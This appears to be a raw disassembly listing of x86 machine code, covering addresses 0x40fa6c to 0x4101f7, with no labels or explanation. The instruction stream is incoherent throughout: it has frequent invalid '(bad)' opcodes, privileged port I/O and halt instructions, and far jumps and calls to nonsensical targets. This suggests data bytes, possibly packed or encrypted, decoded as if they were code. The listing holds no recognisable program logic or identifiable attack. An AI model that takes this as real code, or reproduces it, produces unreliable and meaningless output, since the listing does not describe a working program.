  40fa6c:	inc    esi
  40fa6d:	jl     0x40fa13
  40fa6f:	add    BYTE PTR [esi+eax*8-0x601ab2f0],dh
  40fa76:	sub    ecx,0x5120a437
  40fa7c:	cmp    ah,dh
  40fa7e:	jnp    0x40fad6
  40fa80:	shl    DWORD PTR gs:[esp+ebp*2],cl
  40fa84:	mov    dl,0x89
  40fa86:	cmp    ebx,DWORD PTR [esi]
  40fa88:	ret    0xdbbd
  40fa8b:	loope  0x40fa8b
  40fa8d:	(bad)  
  40fa8f:	push   cs
  40fa90:	sub    edx,DWORD PTR [ebx+0x51fc575a]
  40fa96:	push   es
  40fa97:	sub    eax,0x99b57f4d
  40fa9c:	xor    edi,ebp
  40fa9e:	dec    eax
  40fa9f:	loope  0x40fa82
  40faa1:	shl    esi,0xa0
  40faa4:	aas    
  40faa5:	pop    esi
  40faa6:	mov    esi,0x63b44940
  40faab:	add    al,0x40
  40faad:	push   eax
  40faae:	push   edx
  40faaf:	xor    ah,BYTE PTR [edx-0x2bc022f1]
  40fab5:	adc    al,cl
  40fab7:	jae    0x40fab7
  40fab9:	sar    BYTE PTR [eax],1
  40fabb:	lds    edi,FWORD PTR [ebp+0x23b95ba7]
  40fac1:	sbb    eax,0xc5e5dc45
  40fac6:	arpl   sp,bp
  40fac8:	in     eax,dx
  40fac9:	sub    al,0x88
  40facb:	clc    
  40facc:	mov    esi,DWORD PTR ds:0x9e2ff68b
  40fad2:	shr    DWORD PTR [ebx+0x45],cl
  40fad5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fad6:	imul   edx,eax,0x4aeaa671
  40fadc:	hlt    
  40fadd:	scas   al,BYTE PTR es:[edi]
  40fade:	xchg   esi,eax
  40fadf:	fwait
  40fae0:	adc    BYTE PTR [edi+0x611e1cc9],0x7e
  40fae7:	outs   dx,BYTE PTR ds:[esi]
  40fae8:	dec    esp
  40fae9:	call   0xdf66:0x26c15044
  40faf0:	push   ebx
  40faf1:	xchg   ecx,eax
  40faf2:	cwde   
  40faf3:	inc    ebp
  40faf4:	cmp    ecx,DWORD PTR [ebx+eax*8]
  40faf7:	xchg   esp,eax
  40faf8:	(bad)  
  40faf9:	mov    edi,0xbb0bb323
  40fafe:	cmp    eax,DWORD PTR [edx+0x330b8d7a]
  40fb04:	(bad)  
  40fb05:	cmc    
  40fb06:	outs   dx,BYTE PTR ds:[esi]
  40fb07:	enter  0x7ed6,0x10
  40fb0b:	je     0x40face
  40fb0d:	add    ebx,DWORD PTR [ebp+0x5a]
  40fb10:	std    
  40fb11:	add    DWORD PTR [ebp+0x7023edd7],ebx
  40fb17:	sbb    eax,0xa6577048
  40fb1c:	fdiv   DWORD PTR [ebx-0x19]
  40fb1f:	inc    ebx
  40fb20:	pop    ss
  40fb21:	or     al,0x33
  40fb23:	jmp    0xf459c9e2
  40fb28:	mov    bh,ch
  40fb2a:	adc    BYTE PTR [ecx],ch
  40fb2c:	ror    cl,cl
  40fb2e:	les    eax,FWORD PTR [edx+0xa6e8c17]
  40fb34:	push   esp
  40fb35:	icebp  
  40fb36:	or     al,0x7c
  40fb38:	ret    0xbdbd
  40fb3b:	add    al,0xa7
  40fb3d:	aas    
  40fb3e:	sub    al,0xdd
  40fb40:	sub    BYTE PTR [ebp-0x23],dh
  40fb43:	xchg   al,al
  40fb45:	mov    ds:0x912662d8,eax
  40fb4a:	retf   0x10e3
  40fb4d:	pop    ecx
  40fb4e:	int3   
  40fb4f:	leave  
  40fb50:	cmp    BYTE PTR [edi],al
  40fb52:	pop    ss
  40fb53:	icebp  
  40fb54:	aas    
  40fb55:	or     al,0xc5
  40fb57:	inc    esi
  40fb58:	(bad)  
  40fb59:	jl     0x40fb7b
  40fb5b:	retf   
  40fb5c:	pusha  
  40fb5d:	ret    0xf44d
  40fb60:	adc    BYTE PTR [ebx-0x32467d0b],0x39
  40fb67:	lds    edi,FWORD PTR [esi-0x72]
  40fb6a:	inc    esp
  40fb6b:	mov    eax,ds:0xbc91dfc7
  40fb70:	loopne 0x40fbe4
  40fb72:	jnp    0x40fb5f
  40fb74:	jb     0x40fb9c
  40fb76:	mov    dh,0xa2
  40fb78:	dec    ecx
  40fb79:	or     al,0x14
  40fb7b:	das    
  40fb7c:	in     al,dx
  40fb7d:	dec    eax
  40fb7e:	stc    
  40fb7f:	ficom  WORD PTR [esi-0x2bd887ad]
  40fb85:	xchg   edi,eax
  40fb86:	or     cl,ah
  40fb88:	or     eax,0x6accb39d
  40fb8d:	sbb    esp,eax
  40fb8f:	xchg   esi,eax
  40fb90:	jne    0x40fbff
  40fb92:	jno    0x40fb74
  40fb94:	stos   BYTE PTR es:[edi],al
  40fb95:	xor    DWORD PTR [eax+0x3],edi
  40fb98:	and    bl,ah
  40fb9a:	mov    esi,0xbd0723b2
  40fb9f:	or     BYTE PTR [edx+ebp*2],dh
  40fba2:	jbe    0x40fb4e
  40fba4:	xchg   ecx,eax
  40fba5:	jle    0x40fbb0
  40fba7:	sti    
  40fba8:	retf   0xd34d
  40fbab:	push   es
  40fbac:	push   0xffffffd4
  40fbae:	adc    bh,dh
  40fbb0:	pushf  
  40fbb1:	sbb    DWORD PTR [edi],0xffffff88
  40fbb4:	or     BYTE PTR [esi-0x325b9493],0x81
  40fbbb:	rcr    DWORD PTR [ecx],0xe0
  40fbbe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fbbf:	and    BYTE PTR [ebx+0x5cb7fa78],bl
  40fbc5:	gs inc esp
  40fbc7:	cdq    
  40fbc8:	and    DWORD PTR [edx],0xe
  40fbcb:	mov    dh,0xd
  40fbcd:	mov    ds:0x9d9a2625,al
  40fbd2:	sti    
  40fbd3:	outs   dx,BYTE PTR ds:[esi]
  40fbd4:	cmp    eax,0x9b6a2778
  40fbd9:	mov    esi,0x61930bfa
  40fbde:	xor    esi,eax
  40fbe0:	inc    ecx
  40fbe1:	std    
  40fbe2:	pop    ss
  40fbe3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fbe4:	dec    ebp
  40fbe5:	and    bl,BYTE PTR [eax+0x22]
  40fbe8:	popa   
  40fbe9:	fbstp  TBYTE PTR [edx]
  40fbeb:	mov    ebx,esp
  40fbed:	mov    ah,0xcb
  40fbef:	mov    fs,esi
  40fbf1:	push   esi
  40fbf2:	push   edi
  40fbf3:	sub    BYTE PTR [ebx+0x95d53f5],0xc3
  40fbfa:	mov    bl,0x61
  40fbfc:	and    eax,0x8d387e18
  40fc01:	(bad)  
  40fc02:	ins    DWORD PTR es:[edi],dx
  40fc03:	lea    eax,[esi+0x70ac0466]
  40fc09:	xchg   BYTE PTR [edx],ch
  40fc0b:	push   0xd92b7265
  40fc10:	mov    eax,ds:0x6bf8aca
  40fc15:	or     BYTE PTR [edi-0x39a394c9],0x4b
  40fc1c:	inc    ebp
  40fc1d:	fcomp  st(4)
  40fc1f:	pop    esp
  40fc20:	push   ss
  40fc21:	push   ebp
  40fc22:	mov    bh,0xc0
  40fc24:	popf   
  40fc25:	cli    
  40fc26:	ins    BYTE PTR es:[edi],dx
  40fc27:	nop
  40fc28:	or     al,0x22
  40fc2a:	push   ecx
  40fc2b:	rcr    dh,0xe3
  40fc2e:	vpsrlw ymm4,ymm2,XMMWORD PTR [edi+0x125db501]
  40fc36:	call   0xa5f2:0xb51b780a
  40fc3d:	cdq    
  40fc3e:	sahf   
  40fc3f:	push   cs
  40fc40:	(bad)  
  40fc41:	jne    0x40fc4a
  40fc43:	jae    0x40fcc4
  40fc45:	stos   DWORD PTR es:[edi],eax
  40fc46:	nop
  40fc47:	repz or ch,BYTE PTR [edx+0x1ec41e86]
  40fc4e:	cmp    ebp,DWORD PTR [ebx]
  40fc50:	aad    0x4e
  40fc52:	popa   
  40fc53:	mov    ebx,0xa5608756
  40fc58:	gs and al,0x27
  40fc5b:	sbb    edx,DWORD PTR [eax]
  40fc5d:	mov    edi,0x7cc62728
  40fc62:	xchg   ecx,eax
  40fc63:	jb     0x40fcb8
  40fc65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fc66:	bound  esi,QWORD PTR [edi-0x12195c56]
  40fc6c:	mov    esp,0x33946c5c
  40fc71:	retf   0x7e52
  40fc74:	cwde   
  40fc75:	pop    edx
  40fc76:	in     al,0xdb
  40fc78:	shl    BYTE PTR ds:0xee0a3930,0x7b
  40fc7f:	pusha  
  40fc80:	mov    edx,0x9dd788cb
  40fc85:	das    
  40fc86:	and    dl,0xfd
  40fc89:	push   edi
  40fc8a:	lods   eax,DWORD PTR ds:[esi]
  40fc8b:	mov    ch,0xdf
  40fc8d:	inc    edi
  40fc8e:	push   edi
  40fc8f:	mov    edx,0x729ec7e2
  40fc94:	aam    0x2a
  40fc96:	cld    
  40fc97:	mov    ebx,0xa02f3828
  40fc9c:	es pop eax
  40fc9e:	jmp    0xf402:0x2699b9da
  40fca5:	pop    edi
  40fca6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fca7:	int    0x5b
  40fca9:	mov    bl,0x4e
  40fcab:	sub    al,BYTE PTR [esp+ecx*8-0x73]
  40fcaf:	pop    esi
  40fcb0:	or     BYTE PTR [ebp-0x388a8b8a],ch
  40fcb6:	jmp    0xfbcf0441
  40fcbb:	std    
  40fcbc:	pop    eax
  40fcbd:	enter  0xe755,0x5b
  40fcc1:	xor    dl,BYTE PTR [ebx-0x5ae1528d]
  40fcc7:	push   esi
  40fcc8:	mov    WORD PTR ds:0xc47608f6,fs
  40fcce:	jbe    0x40fce5
  40fcd0:	pop    ebp
  40fcd1:	clc    
  40fcd2:	in     al,dx
  40fcd3:	aad    0xe1
  40fcd5:	dec    edi
  40fcd6:	call   0x11d0:0xc82312d9
  40fcdd:	or     BYTE PTR [esp+esi*4+0x30],ah
  40fce1:	mov    bl,0xc4
  40fce3:	popf   
  40fce4:	and    BYTE PTR [esi-0x4b],dh
  40fce7:	cmp    al,0x7f
  40fce9:	or     DWORD PTR [esi+0x6f382e25],edi
  40fcef:	lock (bad) 
  40fcf2:	mov    BYTE PTR es:[esi],ah
  40fcf5:	add    ch,bh
  40fcf7:	jp     0x40fcc4
  40fcf9:	enter  0x889e,0xb1
  40fcfd:	ret    0x5aa2
  40fd00:	add    eax,0xa294330e
  40fd05:	dec    edx
  40fd06:	int    0x8b
  40fd08:	ja     0x40fd7f
  40fd0a:	idiv   DWORD PTR [ebp-0x40011141]
  40fd10:	icebp  
  40fd11:	inc    esp
  40fd12:	cld    
  40fd13:	dec    edi
  40fd14:	cmc    
  40fd15:	push   0xffffff91
  40fd17:	cmc    
  40fd18:	sub    dl,dh
  40fd1a:	xchg   ebx,eax
  40fd1b:	pop    edi
  40fd1c:	neg    DWORD PTR [edx-0x78]
  40fd1f:	jmp    0x5841:0xee81a2d8
  40fd26:	or     eax,0x82e7679f
  40fd2b:	(bad)  
  40fd2c:	out    0x76,eax
  40fd2e:	cmp    BYTE PTR [esi],bl
  40fd30:	fdivr  QWORD PTR [ecx+0x3d751906]
  40fd36:	call   0x3a9164e9
  40fd3b:	push   0x59
  40fd3d:	jns    0x40fcd4
  40fd3f:	mov    edx,edi
  40fd41:	mov    bh,0xde
  40fd43:	stos   BYTE PTR es:[edi],al
  40fd44:	pop    ebp
  40fd45:	imul   esi,DWORD PTR [ebx],0x5a288569
  40fd4b:	pop    esi
  40fd4c:	mov    al,ds:0x8e4001e0
  40fd51:	xchg   DWORD PTR cs:[ebp-0x78551147],edx
  40fd58:	mov    dh,0x44
  40fd5a:	fadd   st(7),st
  40fd5c:	ins    BYTE PTR es:[edi],dx
  40fd5d:	and    BYTE PTR [ebx],bl
  40fd5f:	fwait
  40fd60:	cmc    
  40fd61:	adc    eax,0x1c
  40fd64:	out    dx,al
  40fd65:	in     al,dx
  40fd66:	ins    DWORD PTR es:[edi],dx
  40fd67:	fistp  DWORD PTR [eax]
  40fd69:	jns    0x40fcfb
  40fd6b:	les    ebp,FWORD PTR [edi]
  40fd6d:	fbld   TBYTE PTR ds:0x8a7a05ee
  40fd73:	xor    al,0x1e
  40fd75:	lea    edi,[eax]
  40fd77:	sbb    DWORD PTR [edx+eax*2+0x141d17db],esi
  40fd7e:	sub    BYTE PTR [esp+ebp*1],ah
  40fd81:	mov    dl,BYTE PTR [edi]
  40fd83:	jnp    0x40fd45
  40fd85:	sub    ch,0xab
  40fd88:	pop    esi
  40fd89:	mov    ebp,0x753ec139
  40fd8e:	fild   QWORD PTR [eax+0xdcab0ef]
  40fd94:	(bad)  
  40fd97:	jb     0x40fd23
  40fd99:	inc    ebx
  40fd9a:	cmp    eax,DWORD PTR [eax+eiz*2+0x24]
  40fd9e:	cmp    ecx,DWORD PTR [edi-0x129f4620]
  40fda4:	jae    0x40fd26
  40fda6:	xchg   ebp,edi
  40fda8:	xlat   BYTE PTR ds:[ebx]
  40fda9:	fwait
  40fdaa:	(bad)  
  40fdab:	sub    BYTE PTR [esi+0x2c920c2],ch
  40fdb1:	jns    0x40fdd6
  40fdb3:	and    edi,DWORD PTR [ecx+ebp*8]
  40fdb6:	or     cl,BYTE PTR [edi+0x39]
  40fdb9:	(bad)  
  40fdba:	jmp    0x7ba948ed
  40fdbf:	fsub   QWORD PTR [edx+0x2c3f71b]
  40fdc5:	mov    al,0xa1
  40fdc7:	mov    esi,DWORD PTR [esi-0x127e4e2e]
  40fdcd:	sbb    DWORD PTR [edx+0xb],0x7cd73e60
  40fdd4:	(bad)  
  40fdd5:	mov    BYTE PTR [edi+0x37295db7],bl
  40fddb:	hlt    
  40fddc:	dec    eax
  40fddd:	push   cs
  40fdde:	push   es
  40fddf:	mov    ds:0xfbfa9499,al
  40fde4:	repnz mov ecx,0x536052df
  40fdea:	inc    eax
  40fdeb:	popa   
  40fdec:	xor    edx,DWORD PTR es:[edi-0xe572185]
  40fdf3:	enter  0x7280,0xdd
  40fdf7:	or     esp,0xf0939a8d
  40fdfd:	ficom  WORD PTR [eax]
  40fdff:	out    0x2,eax
  40fe01:	loope  0x40fdf8
  40fe03:	push   ss
  40fe04:	ins    DWORD PTR es:[edi],dx
  40fe05:	lock sahf 
  40fe07:	add    DWORD PTR [ebp+0x54542740],0x16d0bc70
  40fe11:	and    al,0xb3
  40fe13:	sbb    DWORD PTR [edi-0x73],ebx
  40fe16:	aas    
  40fe17:	add    DWORD PTR [ebx+0xdf368d5],ebp
  40fe1d:	in     al,0xb7
  40fe1f:	gs pop ecx
  40fe21:	loop   0x40fe84
  40fe23:	xchg   ebx,eax
  40fe24:	dec    ebp
  40fe25:	cmp    DWORD PTR [esi],eax
  40fe27:	xchg   edi,eax
  40fe28:	fist   DWORD PTR ss:[esi+0x5084bed3]
  40fe2f:	sar    DWORD PTR [edi-0x4072c33d],1
  40fe35:	fxch   st(4)
  40fe37:	jmp    0x6e04c414
  40fe3c:	or     al,0x73
  40fe3e:	or     ch,BYTE PTR [bp-0xf]
  40fe42:	mov    al,ds:0xad78633d
  40fe47:	scas   eax,DWORD PTR es:[edi]
  40fe48:	push   edx
  40fe49:	hlt    
  40fe4a:	push   cs
  40fe4b:	icebp  
  40fe4c:	add    al,0xb5
  40fe4e:	sbb    al,BYTE PTR [edi]
  40fe50:	out    0xfa,eax
  40fe52:	jge    0x40febb
  40fe54:	mov    ah,0x34
  40fe56:	cmp    bl,BYTE PTR [edx]
  40fe58:	jmp    0x40feb5
  40fe5a:	leave  
  40fe5b:	in     eax,dx
  40fe5c:	imul   DWORD PTR [ebx]
  40fe5e:	xlat   BYTE PTR ds:[ebx]
  40fe5f:	xlat   BYTE PTR ds:[ebx]
  40fe60:	mov    ebx,0x74d880f8
  40fe65:	jno    0x40febe
  40fe67:	cli    
  40fe68:	sub    cl,bl
  40fe6a:	jl     0x40fe9a
  40fe6c:	and    dh,BYTE PTR [ebx-0x1901bff1]
  40fe72:	cwde   
  40fe73:	jae    0x40fed6
  40fe75:	daa    
  40fe76:	xchg   ebx,eax
  40fe77:	cdq    
  40fe78:	push   0xffffffcc
  40fe7a:	repz xchg ecx,eax
  40fe7c:	push   ss
  40fe7d:	add    eax,0xfa5c6a69
  40fe82:	out    dx,eax
  40fe83:	mov    cl,0x69
  40fe85:	jle    0x40fef8
  40fe87:	jns    0x40fea3
  40fe89:	stos   DWORD PTR es:[edi],eax
  40fe8a:	pop    edi
  40fe8b:	clc    
  40fe8c:	or     eax,0xa66a7964
  40fe91:	push   ecx
  40fe92:	fs daa 
  40fe94:	popf   
  40fe95:	and    al,0x8c
  40fe97:	lods   eax,DWORD PTR ds:[esi]
  40fe98:	rcl    BYTE PTR [edx-0x59],cl
  40fe9b:	mov    edx,0x211fbf95
  40fea0:	fstp   DWORD PTR [esi-0x2d]
  40fea3:	js     0x40fe53
  40fea5:	repnz out 0x25,al
  40fea8:	mov    ebx,ss
  40feaa:	imul   ebx,DWORD PTR [esi],0xffffffd6
  40fead:	aad    0xe3
  40feaf:	aad    0x84
  40feb1:	jns    0x40fe4d
  40feb3:	jnp    0x40ff12
  40feb5:	push   ebx
  40feb6:	push   0x48
  40feb8:	cmp    BYTE PTR [esp+ebx*1+0x3d],bh
  40febc:	add    dh,cl
  40febe:	inc    esp
  40febf:	mov    dl,0xd5
  40fec1:	and    esp,DWORD PTR [edx]
  40fec3:	jge    0x40fed2
  40fec5:	lea    edx,[esi-0x40]
  40fec8:	mov    ebp,0xeac026dc
  40fecd:	(bad)  
  40fece:	push   ecx
  40fecf:	adc    ebp,DWORD PTR [ebx+ecx*4]
  40fed2:	add    al,0x2c
  40fed4:	sbb    al,0xb2
  40fed6:	lds    edi,FWORD PTR ds:0x84bc8337
  40fedc:	pop    edx
  40fedd:	ja     0x40feb2
  40fedf:	mov    cl,0x87
  40fee1:	sub    eax,0x84a73dd8
  40fee6:	mov    eax,0x5aa0e564
  40feeb:	repz add dh,al
  40feee:	outs   dx,BYTE PTR ds:[esi]
  40feef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fef0:	in     al,dx
  40fef1:	imul   eax,DWORD PTR [ecx],0x604e52d3
  40fef7:	in     al,0x9e
  40fef9:	dec    ebx
  40fefa:	xor    dh,BYTE PTR [esi+0x3a]
  40fefd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fefe:	sub    al,0xbb
  40ff00:	cwde   
  40ff01:	xor    bl,BYTE PTR [esi-0x22c8aaab]
  40ff07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ff08:	inc    ecx
  40ff09:	and    ebp,DWORD PTR [ebp+0x46d20620]
  40ff0f:	int    0xe
  40ff11:	mov    bl,0x57
  40ff13:	stos   BYTE PTR es:[edi],al
  40ff14:	jecxz  0x40fea6
  40ff16:	imul   esp,DWORD PTR [edi],0xfffffffd
  40ff19:	das    
  40ff1a:	sbb    ah,BYTE PTR [edx]
  40ff1c:	sti    
  40ff1d:	sub    ah,BYTE PTR [esi]
  40ff1f:	das    
  40ff20:	bound  ecx,QWORD PTR [ebp+0x4aec4387]
  40ff26:	rcl    BYTE PTR [edx-0x14],0x43
  40ff2a:	xchg   BYTE PTR [eax-0x5df9b384],ah
  40ff30:	fld    DWORD PTR [esi]
  40ff32:	data16 cmp dh,BYTE PTR [edx+0x4c]
  40ff36:	(bad)  
  40ff37:	sahf   
  40ff38:	xor    eax,0x2622c7ec
  40ff3d:	jg     0x40ff11
  40ff3f:	sbb    DWORD PTR ds:0x5e46286d,ebx
  40ff45:	icebp  
  40ff46:	pop    ss
  40ff47:	ja     0x40ff10
  40ff49:	inc    edx
  40ff4a:	jmp    0x40ffbd
  40ff4c:	sbb    al,0x83
  40ff4e:	jg     0x40ffbe
  40ff50:	mov    ds:0x9aa38677,al
  40ff55:	pop    ebx
  40ff56:	imul   esi,DWORD PTR [ebx+0x1d9f3c95],0xffffffcb
  40ff5d:	shl    BYTE PTR [ebp-0x53],cl
  40ff60:	setae  BYTE PTR [ecx+edx*8+0x71]
  40ff65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff66:	sub    ecx,DWORD PTR [ecx+edx*4]
  40ff69:	sbb    bl,BYTE PTR [eax+0x4056368e]
  40ff6f:	mov    al,0xd3
  40ff71:	push   ebp
  40ff72:	dec    ebp
  40ff73:	ins    BYTE PTR es:[edi],dx
  40ff74:	lds    eax,FWORD PTR [esi+ebx*2]
  40ff77:	imul   ecx,esp,0xffffffe0
  40ff7a:	aam    0x69
  40ff7c:	pop    ebp
  40ff7d:	adc    edi,DWORD PTR [ebx-0x7f]
  40ff80:	fidivr DWORD PTR [edi+0x40]
  40ff83:	das    
  40ff84:	(bad)  
  40ff87:	adc    BYTE PTR [ecx+ebx*8+0xc727112],al
  40ff8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff8f:	cmc    
  40ff90:	jb     0x410001
  40ff92:	inc    edx
  40ff93:	xlat   BYTE PTR ds:[ebx]
  40ff94:	loop   0x40ff54
  40ff96:	pop    esp
  40ff97:	ret    
  40ff98:	xchg   al,cl
  40ff9a:	les    ebx,FWORD PTR [ecx-0x3b]
  40ff9d:	push   ds
  40ff9e:	and    al,0x2
  40ffa0:	pop    ds
  40ffa1:	pop    ebx
  40ffa2:	push   eax
  40ffa3:	dec    ecx
  40ffa4:	daa    
  40ffa5:	or     dl,dh
  40ffa7:	inc    edi
  40ffa8:	lea    ebx,[eax+eiz*4+0x5d777f51]
  40ffaf:	(bad)  
  40ffb0:	fcmovnbe st,st(2)
  40ffb2:	cdq    
  40ffb3:	and    eax,0xb8f68c3a
  40ffb8:	add    al,0x6c
  40ffba:	retf   0xd0e1
  40ffbd:	xchg   ecx,eax
  40ffbe:	jbe    0x410004
  40ffc0:	push   0xfffffff2
  40ffc2:	stos   DWORD PTR es:[edi],eax
  40ffc3:	out    0x7,eax
  40ffc5:	jmp    0x40ffc9
  40ffc7:	sbb    al,0xe
  40ffc9:	out    dx,al
  40ffca:	jmp    0xad571c74
  40ffcf:	jnp    0x735057a4
  40ffd5:	test   BYTE PTR [edx-0x627f11b4],dh
  40ffdb:	lds    edx,FWORD PTR ds:0x6d4021c5
  40ffe1:	push   ss
  40ffe2:	mov    bh,BYTE PTR [edi]
  40ffe4:	cdq    
  40ffe5:	clc    
  40ffe6:	push   ebx
  40ffe7:	nop
  40ffe8:	inc    edi
  40ffe9:	or     cl,BYTE PTR [ecx+0x55]
  40ffec:	mov    esi,0xd7f69861
  40fff1:	sub    BYTE PTR [edx+edx*2-0x76],al
  40fff5:	ret    
  40fff6:	fistp  WORD PTR [esp+edi*4+0x53]
  40fffa:	mov    bl,0xc9
  40fffc:	aaa    
  40fffd:	fstp   DWORD PTR [ecx]
  40ffff:	fcmovnbe st,st(3)
  410001:	mov    WORD PTR [eax-0x1dc45746],fs
  410007:	mov    edi,edi
  410009:	je     0x40ffb1
  41000b:	or     DWORD PTR [edi],0xb80508f
  410011:	js     0x41007b
  410013:	jmp    0xd1:0x9aa189fb
  41001a:	pop    edx
  41001b:	dec    ecx
  41001c:	mov    ds:0x97c314e5,eax
  410021:	scas   eax,DWORD PTR es:[edi]
  410022:	jo     0x41000a
  410024:	stc    
  410025:	xlat   BYTE PTR ds:[ebx]
  410026:	fsubr  QWORD PTR [ebx-0x534be188]
  41002c:	es inc edx
  41002e:	in     al,0x95
  410030:	test   al,0xab
  410032:	adc    DWORD PTR [eax],eax
  410034:	(bad)  
  410035:	imul   BYTE PTR [ebp+0x280028ca]
  41003b:	or     dl,BYTE PTR [esi+eax*4-0x47]
  41003f:	rcl    ah,1
  410041:	sbb    ecx,0x4c
  410044:	push   ebx
  410045:	loopne 0x41003c
  410047:	and    DWORD PTR [eax-0xcbbccda],ebp
  41004d:	xchg   edi,eax
  41004e:	dec    esi
  41004f:	cmp    dl,dh
  410051:	sahf   
  410052:	jno    0x40ffde
  410054:	inc    ebp
  410055:	fimul  DWORD PTR [edx-0x3cc340b7]
  41005b:	aas    
  41005c:	cmc    
  41005d:	pop    esp
  41005e:	in     al,dx
  41005f:	xor    ecx,DWORD PTR [ebp-0x5c248604]
  410065:	in     eax,dx
  410066:	pop    ebp
  410067:	es dec eax
  410069:	xor    eax,0x86e098bb
  41006e:	jo     0x41002f
  410070:	fidivr WORD PTR [ecx+0x4]
  410073:	jae    0x410008
  410075:	call   0xa59e490d
  41007a:	sbb    eax,0x8f2e0985
  41007f:	push   ebx
  410080:	inc    ecx
  410081:	mov    edi,edi
  410083:	dec    DWORD PTR ds:[eax+0x11bb2a6f]
  41008a:	hlt    
  41008b:	and    eax,0x3b897fc1
  410090:	jbe    0x4100d9
  410092:	sub    bl,dh
  410094:	pop    ds
  410095:	(bad)  
  410096:	jmp    0xb9425540
  41009b:	sbb    ch,dh
  41009d:	nop
  41009e:	loopne 0x410028
  4100a0:	pop    eax
  4100a1:	enter  0xfc24,0xb4
  4100a5:	jbe    0x410107
  4100a7:	pusha  
  4100a8:	cmc    
  4100a9:	sub    al,0x8c
  4100ab:	outs   dx,DWORD PTR ds:[esi]
  4100ac:	data16 xor BYTE PTR [edx+0x5],0xa6
  4100b1:	addr16 inc ebp
  4100b3:	cli    
  4100b4:	add    BYTE PTR [ecx+0x6f],cl
  4100b7:	nop
  4100b8:	out    0x73,al
  4100ba:	mov    al,0x3c
  4100bc:	xlat   BYTE PTR ds:[ebx]
  4100bd:	jge    0x410138
  4100bf:	out    dx,eax
  4100c0:	push   ecx
  4100c1:	mov    ebp,0x673e23a6
  4100c6:	xor    eax,0x12c48801
  4100cc:	jle    0x41007e
  4100ce:	push   0xe6f74b84
  4100d3:	loopne 0x4100a7
  4100d5:	add    ebx,esi
  4100d7:	jle    0x410090
  4100d9:	pop    ds
  4100da:	out    0x79,al
  4100dc:	adc    eax,0x66b46250
  4100e1:	sbb    esp,eax
  4100e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4100e4:	fcmovnbe st,st(3)
  4100e6:	loopne 0x410160
  4100e8:	fs mov bh,0x5b
  4100eb:	int3   
  4100ec:	leave  
  4100ed:	add    ebx,0x77338045
  4100f3:	shl    DWORD PTR [ecx-0x7bc4e799],1
  4100f9:	loopne 0x410161
  4100fb:	cli    
  4100fc:	sti    
  4100fd:	stc    
  4100fe:	idiv   BYTE PTR [esi]
  410100:	stos   DWORD PTR es:[edi],eax
  410101:	outs   dx,DWORD PTR ds:[esi]
  410102:	adc    DWORD PTR [bp+di-0xf25],esi
  410107:	push   0x14
  410109:	sbb    esi,eax
  41010b:	std    
  41010c:	jmp    0x4100b3
  41010e:	out    0x1e,al
  410110:	enter  0xb304,0x72
  410114:	mov    eax,0x2f0b0073
  410119:	pop    esi
  41011a:	gs xor al,0x83
  41011d:	sahf   
  41011e:	mov    ecx,DWORD PTR [ebx+0x32]
  410121:	enter  0xbaeb,0x46
  410125:	xor    esi,eax
  410127:	arpl   bp,sp
  410129:	(bad)  
  41012b:	mov    bl,0x76
  41012d:	mov    ebx,0x6252a3e5
  410132:	sbb    BYTE PTR [ecx-0x47],ah
  410135:	scas   eax,DWORD PTR es:[edi]
  410136:	(bad)  
  410137:	push   edi
  410138:	dec    ecx
  410139:	repnz cdq 
  41013b:	sub    al,BYTE PTR [ecx]
  41013d:	sub    ecx,DWORD PTR [esi-0x749f21a6]
  410143:	cmp    dh,BYTE PTR [edi-0x2897526e]
  410149:	loope  0x410189
  41014b:	mov    ebp,ebp
  41014d:	shl    DWORD PTR [ecx-0x4adec6e9],0xc
  410154:	mov    al,0xef
  410156:	lea    edx,[ecx]
  410158:	mov    edi,0xcdb90bdc
  41015d:	xor    ch,BYTE PTR [ebp+esi*8+0x39bdc3b]
  410164:	cdq    
  410165:	(bad)  
  410166:	fist   WORD PTR [eax]
  410168:	aaa    
  410169:	data16 int 0xc3
  41016c:	adc    al,BYTE PTR [edi]
  41016e:	(bad)  
  41016f:	retf   
  410170:	xchg   edi,ecx
  410172:	xchg   DWORD PTR [ebp+0x2d],edx
  410175:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410176:	mov    dh,0x1a
  410178:	in     eax,0x93
  41017a:	mov    al,ds:0xac374a65
  410180:	repz dec ebx
  410182:	or     edi,DWORD PTR [ecx+0x332c5739]
  410188:	in     eax,0x5d
  41018a:	std    
  41018b:	pop    edi
  41018c:	jae    0x41013b
  41018e:	xchg   ebp,eax
  41018f:	push   ss
  410190:	dec    ebp
  410191:	dec    ebp
  410192:	adc    ebp,DWORD PTR [edi-0xc]
  410195:	addr16 cld 
  410197:	bound  eax,QWORD PTR [esi-0x78]
  41019a:	aaa    
  41019b:	mov    dh,0xc7
  41019d:	xchg   BYTE PTR [eax+edx*8+0x5e0cd929],ch
  4101a4:	adc    dh,BYTE PTR [edi]
  4101a6:	pop    ecx
  4101a7:	jg     0x4101d4
  4101a9:	adc    DWORD PTR [ebp+0x6b82d2b8],ebp
  4101af:	mov    ecx,0x58253786
  4101b4:	xor    DWORD PTR ds:0xc5b03e42,ecx
  4101ba:	dec    ch
  4101bc:	adc    al,0xd5
  4101be:	xchg   ecx,eax
  4101bf:	push   0x3053467e
  4101c4:	cmp    WORD PTR [ebp+ecx*4-0x7c],cx
  4101c9:	rcl    dl,0x64
  4101cc:	jmp    0xe7b6a2d0
  4101d1:	jno    0x4101b0
  4101d3:	js     0x410203
  4101d5:	pop    es
  4101d6:	test   BYTE PTR [ebx+0x605484b7],bl
  4101dc:	fadd   st,st(3)
  4101de:	and    eax,DWORD PTR [edx]
  4101e0:	xor    eax,0xb425cdca
  4101e5:	or     BYTE PTR [esi+0x1b83d32b],bh
  4101eb:	mov    esi,0x9c76e249
  4101f0:	or     ah,BYTE PTR [ebx-0x39d12f06]
  4101f6:	lods   eax,DWORD PTR ds:[esi]
  4101f7:	push   ds
